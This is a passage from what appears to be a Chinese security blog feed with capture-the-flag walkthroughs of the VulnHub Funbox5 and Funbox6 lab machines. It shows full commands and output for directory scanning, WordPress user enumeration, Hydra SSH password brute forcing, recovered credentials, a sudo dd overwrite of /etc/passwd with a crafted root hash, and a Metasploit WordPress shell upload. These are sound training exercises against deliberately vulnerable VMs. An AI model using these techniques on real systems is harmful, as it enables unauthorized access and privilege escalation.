<h3 id="继续目录扫描"><a href="#继续目录扫描" class="headerlink" title="继续目录扫描"></a>继续目录扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.204/drupal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.204/drupal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php                                                                                1 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.204/drupal/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/20 10:12:50 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/wp-content           (Status: 301) [Size: 326] [--&gt; http://192.168.1.204/drupal/wp-content/]</span><br><span class="line">/index.php            (Status: 200) [Size: 62847]                                            </span><br><span class="line">/wp-login.php         (Status: 200) [Size: 6408]                                             </span><br><span class="line">/license.txt          (Status: 200) [Size: 19915]                                            </span><br><span class="line">/wp-includes          (Status: 301) [Size: 327] [--&gt; http://192.168.1.204/drupal/wp-includes/]</span><br><span class="line">/readme.html          (Status: 200) [Size: 7278]                                              </span><br><span class="line">/wp-trackback.php     (Status: 200) [Size: 135]                                               </span><br><span class="line">/wp-admin             (Status: 301) [Size: 324] [--&gt; http://192.168.1.204/drupal/wp-admin/]   </span><br><span class="line">/xmlrpc.php           (Status: 405) [Size: 42]                                                </span><br><span class="line">/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://192.168.178.33/drupal/wp-login.php?action=register]</span><br><span class="line">                                                                                                             </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/20 10:15:14 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<ul>
<li>确定为 <code>wordpress</code>框架</li>
</ul>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.1.204/drupal/index.php --enumerate u,p --ignore-main-redirect --wp-content-dir=http://192.168.1.204/drupal/wp-content</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# wpscan --url http://192.168.1.204/drupal/index.php --enumerate u,p --ignore-main-redirect --wp-content-dir=http://192.168.1.204/drupal/wp-content                                                           3 ⨯</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.17</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.1.204/drupal/index.php/ [192.168.1.204]</span><br><span class="line">[+] Started: Tue Jul 20 10:30:07 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://192.168.1.204/drupal/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).</span><br><span class="line"> | Found By: Emoji Settings (Passive Detection)</span><br><span class="line"> |  - http://192.168.1.204/drupal/index.php/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.1'</span><br><span class="line"> | Confirmed By: Meta Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.1.204/drupal/index.php/, Match: 'WordPress 5.5.1'</span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Most Popular Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.1.204/drupal/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] ben</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.1.204/drupal/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Tue Jul 20 10:32:20 2021</span><br><span class="line">[+] Requests Done: 47</span><br><span class="line">[+] Cached Requests: 15</span><br><span class="line">[+] Data Sent: 14.04 KB</span><br><span class="line">[+] Data Received: 1.143 MB</span><br><span class="line">[+] Memory used: 186.473 MB</span><br><span class="line">[+] Elapsed time: 00:02:13</span><br></pre></td></tr></table></figure>

<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><ul>
<li><code>ssh</code>爆破</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.204 -t 4 ssh</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;</span></span><br><span class="line">                                                                                                                                                                                                                    </span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox5]</span><br><span class="line">└─# hydra -l ben -P /usr/share/wordlists/rockyou.txt 192.168.1.204 ssh                                                           </span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-20 10:47:55</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.204:22/</span><br><span class="line">[STATUS] 180.00 tries/min, 180 tries in 00:01h, 14344223 to do in 1328:11h, 16 active</span><br><span class="line">[22][ssh] host: 192.168.1.204   login: ben   password: pookie</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 6 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 6 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-20 10:50:58</span><br></pre></td></tr></table></figure>

<ul>
<li>获得账号密码<code>ben / pookie</code></li>
</ul>
<h3 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得<code>shell</code></h3><p><img data-src="./Funbox5/4.png" alt></p>
<ul>
<li>发现部分命令受限</li>
</ul>
<p><img data-src="./Funbox5/5.png" alt></p>
<ul>
<li>查看网络服务</li>
</ul>
<p><img data-src="./Funbox5/6.png" alt></p>
<ul>
<li><code>telnet 127.0.0.1 110</code></li>
</ul>
<p><img data-src="./Funbox5/7.png" alt></p>
<p><img data-src="./Funbox5/8.png" alt></p>
<ul>
<li>获取账号密码<code>adam / qwedsayxc!</code></li>
</ul>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li>登录<code>ssh adam@192.168.1.204</code></li>
</ul>
<p><img data-src="./Funbox5/9.png" alt></p>
<ul>
<li><code>sudo -l</code></li>
</ul>
<p><img data-src="./Funbox5/10.png" alt></p>
<ul>
<li><code>dd</code>复制文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512 123456</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">6<span class="variable">$nXD0Rbe1lMAs29z9</span><span class="variable">$TzcGD6x</span>/jgTp9VL/wYb7RB7ltazFPfzCMtvxaTNyUtB0SdunRk9LjhF3fsKzsGqEvYWJ7h8D.uqSI6hDBRMVN1</span></span><br><span class="line"></span><br><span class="line">cp /etc/passwd /tmp/passwd</span><br><span class="line"></span><br><span class="line">┌──(root💀weiyi)-[/tmp]</span><br><span class="line">└─# cat passwd </span><br><span class="line">root:$6$nXD0Rbe1lMAs29z9$TzcGD6x/jgTp9VL/wYb7RB7ltazFPfzCMtvxaTNyUtB0SdunRk9LjhF3fsKzsGqEvYWJ7h8D.uqSI6hDBRMVN1:0:0:root:/root://bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 传输文件</span></span><br><span class="line">scp /tmp/passwd adam@192.168.1.204:/home/adam/passwd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 拷贝</span></span><br><span class="line">sudo /bin/dd if=/home/adam/passwd of=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox5/11.png" alt></p>
<p><img data-src="./Funbox5/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox6</title>
    <url>/2021/07/29/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox6/</url>
    <content><![CDATA[<h1 id="Funbox6"><a href="#Funbox6" class="headerlink" title="Funbox6"></a>Funbox6</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Funbox6</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/etc]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2	20:41:10:1a:04:8c	(Unknown)</span><br><span class="line">192.168.1.109	40:31:3c:22:9c:f3	XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.111	38:d2:ca:db:01:69	Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line">192.168.1.234	08:00:27:b7:82:d0	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.163	a4:50:46:78:16:9f	Xiaomi Communications Co Ltd</span><br><span class="line"></span><br><span class="line">8 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.982 seconds (129.16 hosts/sec). 8 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.234</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.234</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/etc]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.234</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 20:04 EDT</span><br><span class="line">Nmap scan report for funbox6.lan (192.168.1.234)</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 0e:4f:3c:37:75:8a:a4:4d:bb:17:50:1b:ec:93:02:15 (RSA)</span><br><span class="line">|   256 d7:dc:fc:b1:76:d6:76:13:da:ea:c4:30:04:bc:da:d2 (ECDSA)</span><br><span class="line">|_  256 51:19:47:a6:29:c8:22:10:c2:73:34:ad:de:7f:57:d3 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://funbox6.box/</span><br><span class="line">MAC Address: 08:00:27:B7:82:D0 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Funbox6/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.234/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -t 1</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/tmp]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.234/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -t 2</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.234/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 2</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/20 20:15:23 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 61851]</span><br><span class="line">/wp-content           (Status: 301) [Size: 319] [--&gt; http://192.168.1.234/wp-content/]</span><br><span class="line">/wp-login.php         (Status: 200) [Size: 6159]                                      </span><br><span class="line">/license.txt          (Status: 200) [Size: 19915]                                     </span><br><span class="line">/wp-includes          (Status: 301) [Size: 320] [--&gt; http://192.168.1.234/wp-includes/]</span><br><span class="line">/readme.html          (Status: 200) [Size: 7278]                                       </span><br><span class="line">/wp-trackback.php     (Status: 200) [Size: 135]                                        </span><br><span class="line">/wp-admin             (Status: 301) [Size: 317] [--&gt; http://192.168.1.234/wp-admin/]   </span><br><span class="line">/xmlrpc.php           (Status: 405) [Size: 42]                                         </span><br><span class="line">/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://funbox6.box/wp-login.php?action=register]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                                    </span><br><span class="line">                                                                                                   </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/20 20:18:59 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li><p>配置<code>host</code>, <code>192.168.1.234 funbox6.box</code></p>
</li>
<li><p>首页</p>
</li>
</ul>
<p><img data-src="./Funbox6/2.png" alt></p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;funbox6.box&#x2F; --enumerate u</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">┌──(root💀weiyi)-[&#x2F;etc]</span><br><span class="line">└─# wpscan --url http:&#x2F;&#x2F;funbox6.box&#x2F; --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        &#x2F; &#x2F;  __ \ &#x2F; ____|</span><br><span class="line">          \ \  &#x2F;\  &#x2F; &#x2F;| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \&#x2F;  \&#x2F; &#x2F; |  ___&#x2F; \___ \ &#x2F; __|&#x2F; _&#96; | &#39;_ \</span><br><span class="line">            \  &#x2F;\  &#x2F;  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \&#x2F;  \&#x2F;   |_|    |_____&#x2F; \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.17</span><br><span class="line">       Sponsored by Automattic - https:&#x2F;&#x2F;automattic.com&#x2F;</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http:&#x2F;&#x2F;funbox6.box&#x2F; [192.168.1.234]</span><br><span class="line">[+] Started: Tue Jul 20 20:10:32 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http:&#x2F;&#x2F;funbox6.box&#x2F;xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http:&#x2F;&#x2F;codex.wordpress.org&#x2F;XML-RPC_Pingback_API</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_ghost_scanner&#x2F;</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;dos&#x2F;http&#x2F;wordpress_xmlrpc_dos&#x2F;</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_xmlrpc_login&#x2F;</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_pingback_access&#x2F;</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http:&#x2F;&#x2F;funbox6.box&#x2F;readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http:&#x2F;&#x2F;funbox6.box&#x2F;wp-content&#x2F;uploads&#x2F;</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http:&#x2F;&#x2F;funbox6.box&#x2F;wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.iplocation.net&#x2F;defend-wordpress-from-ddos</span><br><span class="line"> |  - https:&#x2F;&#x2F;github.com&#x2F;wpscanteam&#x2F;wpscan&#x2F;issues&#x2F;1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;funbox6.box&#x2F;index.php&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.5.1&lt;&#x2F;generator&gt;</span><br><span class="line"> |  - http:&#x2F;&#x2F;funbox6.box&#x2F;index.php&#x2F;comments&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.5.1&lt;&#x2F;generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http:&#x2F;&#x2F;funbox6.box&#x2F;wp-content&#x2F;themes&#x2F;twentyseventeen&#x2F;</span><br><span class="line"> | Last Updated: 2021-04-27T00:00:00.000Z</span><br><span class="line"> | Readme: http:&#x2F;&#x2F;funbox6.box&#x2F;wp-content&#x2F;themes&#x2F;twentyseventeen&#x2F;readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.7</span><br><span class="line"> | Style URL: http:&#x2F;&#x2F;funbox6.box&#x2F;wp-content&#x2F;themes&#x2F;twentyseventeen&#x2F;style.css?ver&#x3D;20190507</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https:&#x2F;&#x2F;wordpress.org&#x2F;themes&#x2F;twentyseventeen&#x2F;</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https:&#x2F;&#x2F;wordpress.org&#x2F;</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.4 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;funbox6.box&#x2F;wp-content&#x2F;themes&#x2F;twentyseventeen&#x2F;style.css?ver&#x3D;20190507, Match: &#39;Version: 2.4&#39;</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; (10 &#x2F; 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;funbox6.box&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https:&#x2F;&#x2F;wpscan.com&#x2F;register</span><br><span class="line"></span><br><span class="line">[+] Finished: Tue Jul 20 20:10:35 2021</span><br><span class="line">[+] Requests Done: 54</span><br><span class="line">[+] Cached Requests: 7</span><br><span class="line">[+] Data Sent: 13.336 KB</span><br><span class="line">[+] Data Received: 514.236 KB</span><br><span class="line">[+] Memory used: 159.75 MB</span><br><span class="line">[+] Elapsed time: 00:00:02</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wpscan --url http:&#x2F;&#x2F;funbox6.box&#x2F; -U admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -t 1</span><br></pre></td></tr></table></figure>

<ul>
<li>发现敏感信息</li>
</ul>
<p><img data-src="./Funbox6/3.png" alt></p>
<ul>
<li><code>base32</code>解码</li>
</ul>
<p><img data-src="./Funbox6/4.png" alt></p>
<ul>
<li><p>获得账号密码<code>admin:gamblehall777</code></p>
</li>
<li><p>后台登录</p>
</li>
<li><p>需要先点击如下，才可以登录后台</p>
</li>
</ul>
<p><img data-src="./Funbox6/5.png" alt></p>
<h3 id="MSF上传shell"><a href="#MSF上传shell" class="headerlink" title="MSF上传shell"></a>MSF上传shell</h3><p><img data-src="./Funbox6/6.png" alt></p>
<ul>
<li>报错</li>
</ul>
<p><img data-src="./Funbox6/7.png" alt></p>
<ul>
<li>修改攻击代码</li>
</ul>
<p><a href="https://jhalon.github.io/vulnhub-mr-robot1/" target="_blank" rel="noopener">https://jhalon.github.io/vulnhub-mr-robot1/</a></p>
<p><img data-src="./Funbox6/8.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /usr/share/metasploit-framework/modules/exploits/unix/webapp/wp_admin_shell_upload.rb</span><br></pre></td></tr></table></figure>

<ul>
<li>攻击成功</li>
</ul>
<p><img data-src="./Funbox6/9.png" alt></p>
<h4 id="提权-amp-amp-FLag"><a href="#提权-amp-amp-FLag" class="headerlink" title="提权&amp;&amp;FLag"></a>提权&amp;&amp;FLag</h4><p><img data-src="./Funbox6/10.png" alt></p>
<p><img data-src="./Funbox6/11.png" alt></p>
<p>定时开关<code>web</code>,好<code>TM</code>蠢的靶场</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox7</title>
    <url>/2021/07/29/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox7/</url>
